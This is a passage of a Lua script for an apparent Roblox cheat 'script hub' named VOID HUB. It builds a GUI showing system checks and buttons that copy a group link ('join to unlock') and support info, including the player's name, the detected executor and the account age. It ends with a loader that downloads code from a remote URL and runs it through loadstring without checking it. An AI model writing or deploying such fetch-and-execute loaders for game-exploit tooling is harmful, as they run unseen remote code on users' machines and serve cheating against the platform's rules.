sysTitle.Position             = UDim2.new(0, 10, 0, 10)
sysTitle.TextXAlignment       = Enum.TextXAlignment.Left
sysTitle.ZIndex               = 3
sysTitle.Parent               = systemPage

local sysSep = Instance.new("Frame")
sysSep.Size             = UDim2.new(1, -20, 0, 1)
sysSep.Position         = UDim2.new(0, 10, 0, 34)
sysSep.BackgroundColor3 = C.BlueEdge
sysSep.BorderSizePixel  = 0
sysSep.ZIndex           = 3
sysSep.Parent           = systemPage

local checkList = Instance.new("Frame")
checkList.Size                = UDim2.new(1, -20, 0, 148)
checkList.Position            = UDim2.new(0, 10, 0, 42)
checkList.BackgroundTransparency = 1
checkList.ClipsDescendants    = true
checkList.ZIndex              = 3
checkList.Parent              = systemPage

local listLayout = Instance.new("UIListLayout")
listLayout.SortOrder = Enum.SortOrder.LayoutOrder
listLayout.Padding   = UDim.new(0, 3)
listLayout.Parent    = checkList

function renderChecks(checks)
    for _, child in ipairs(checkList:GetChildren()) do
        if child:IsA("Frame") then child:Destroy() end
    end
    for i, chk in ipairs(checks) do
        local row = Instance.new("Frame")
        row.Size                   = UDim2.new(1, 0, 0, 20)
        row.BackgroundColor3       = C.Void
        row.BorderSizePixel        = 0
        row.LayoutOrder            = i
        row.ZIndex                 = 3
        row.Parent                 = checkList
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 4)

        local rowBar = Instance.new("Frame")
        rowBar.Size             = UDim2.new(0, 2, 0.6, 0)
        rowBar.Position         = UDim2.new(0, 0, 0.2, 0)
        rowBar.BackgroundColor3 = chk.passed and C.Success or C.Fail
        rowBar.BorderSizePixel  = 0
        rowBar.ZIndex           = 4
        rowBar.Parent           = row
        Instance.new("UICorner", rowBar).CornerRadius = UDim.new(0, 2)

        local icon = Instance.new("TextLabel")
        icon.Text                 = chk.passed and "✓" or "✗"
        icon.Font                 = Enum.Font.GothamBold
        icon.TextSize             = 11
        icon.TextColor3           = chk.passed and C.Success or C.Fail
        icon.BackgroundTransparency = 1
        icon.Size                 = UDim2.new(0, 20, 1, 0)
        icon.Position             = UDim2.new(0, 4, 0, 0)
        icon.TextXAlignment       = Enum.TextXAlignment.Center
        icon.ZIndex               = 4
        icon.Parent               = row

        local lbel = Instance.new("TextLabel")
        lbel.Text                 = chk.label
        lbel.Font                 = Enum.Font.Gotham
        lbel.TextSize             = 10
        lbel.TextColor3           = C.Ghost
        lbel.BackgroundTransparency = 1
        lbel.Size                 = UDim2.new(1, -28, 1, 0)
        lbel.Position             = UDim2.new(0, 26, 0, 0)
        lbel.TextXAlignment       = Enum.TextXAlignment.Left
        lbel.ZIndex               = 4
        lbel.Parent               = row
    end
end

renderChecks(buildChecks())

local copyGroupBtn = makeBtn(systemPage, "🔗  Copy Group Link  (join to unlock)", 198, false)
local copyInfoBtn  = makeBtn(systemPage, "📋  Copy Support Info", 232, false)
local copyLinkBtn  = makeBtn(systemPage, "🔗  Copy Backup Link", 266, false)

copyGroupBtn.MouseButton1Click:Connect(function()
    copyToClipboard(HUB.GROUP_URL)
    copyGroupBtn.Text = "✓  Copied — paste in browser"
    task.delay(2, function() copyGroupBtn.Text = "🔗  Copy Group Link  (join to unlock)" end)
end)

copyInfoBtn.MouseButton1Click:Connect(function()
    local info = ("VOID HUB %s | %s | Executor: %s | Age: %d days | Game: %d")
        :format(HUB.Version, LocalPlayer.Name, detectExecutor(), getAccountAge(), game.PlaceId)
    copyToClipboard(info)
    copyInfoBtn.Text = "✓  Copied!"
    task.delay(1.5, function() copyInfoBtn.Text = "📋  Copy Support Info" end)
end)

copyLinkBtn.MouseButton1Click:Connect(function()
    copyToClipboard(HUB.BackupURL)
    copyLinkBtn.Text = "✓  Copied!"
    task.delay(1.5, function() copyLinkBtn.Text = "🔗  Copy Backup Link" end)
end)

-- ============================================================
--  TAB SWITCH
-- ============================================================

local function switchTab(name)
    activeTab = name
    for tName, page in pairs(tabPages) do page.Visible = (tName==name) end
    for tName, btn in pairs(tabBtns) do
        local active = (tName==name)
        btn.TextColor3       = active and C.White or C.Ghost
        btn.BackgroundColor3 = active and C.Electric or C.NavyMid
    end
end

for name, btn in pairs(tabBtns) do
    btn.MouseButton1Click:Connect(function() switchTab(name) end)
end

switchTab("System")

-- ============================================================
--  FADE IN
-- ============================================================

Root.BackgroundTransparency = 1
TweenService:Create(Root, TweenInfo.new(0.35, Enum.EasingStyle.Quad), {
    BackgroundTransparency = 0
}):Play()

-- ============================================================
--  KEYBIND
-- ============================================================

UserInputService.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.RightShift then
        Root.Visible = not Root.Visible
    end
end)

-- ============================================================
--  LOADER
-- ============================================================

local function loadMain()
    if HUB.SCRIPT_URL == "" then return end
    if not httpRequest then warn("[VOID HUB] No HTTP function.") return end
    local ok, res = pcall(httpRequest, { Url=HUB.SCRIPT_URL, Method="GET" })
    if ok and res and res.StatusCode==200 then
        local fn, err = _loadstring(res.Body)
        if fn then pcall(fn) else warn("[VOID HUB] loadstring: "..tostring(err)) end
    else
        warn("[VOID HUB] Fetch failed: "..tostring(ok and res and res.StatusCode or "N/A"))
    end
end

task.spawn(loadMain)
print("[VOID HUB] Loaded — "..HUB.Version)
